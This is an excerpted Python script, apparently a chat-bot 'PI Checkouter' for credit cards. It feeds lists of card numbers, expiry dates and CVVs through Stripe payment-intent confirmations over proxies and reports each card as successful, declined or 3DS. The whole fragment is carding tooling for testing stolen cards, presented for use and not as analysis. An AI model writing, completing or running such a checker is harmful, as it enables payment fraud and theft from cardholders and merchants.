...
def pistuff(cc, mes, ano, cvv, pk, secretpi, proxies):
    ...
    response = session.post(f'https://api.stripe.com/v1/payment_intents/{secretpi}/confirm', headers=headers, data=data, proxies=proxies)
    ...
    if '"status": "succeeded"' in response.text:
        return (f"\n✫PI Checkouter✫\n➥ 💳 𝐂𝐂 -» {cc}|{mes}|{ano}|{cvv}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Payment successful", True, response, secretpi)
        ...
        return (f"\n✫PI Checkouter✫\n➥ 💳 𝐂𝐂 -» {cc}|{mes}|{ano}|{cvv}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Declined\n➥ 🔥 𝐒𝐭𝐚𝐭𝐮𝐬 -» 3DS CARD", False, response, secretpi)
    else:
        return (f"\n✫PI Checkouter✫\n➥ 💳 𝐂𝐂 -» {cc}|{mes}|{ano}|{cvv}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Declined\n➥ 🔥 𝐒𝐭𝐚𝐭𝐮𝐬 -» {code} | {decline_code} | {message}", False, response, secretpi)
...
async def handle_cc(client, message):
    ...
    for i in content:
        ...
        result, success, response, pi = pistuff(cc, mes, ano, cvv, pk, cs, proxies=proxies)
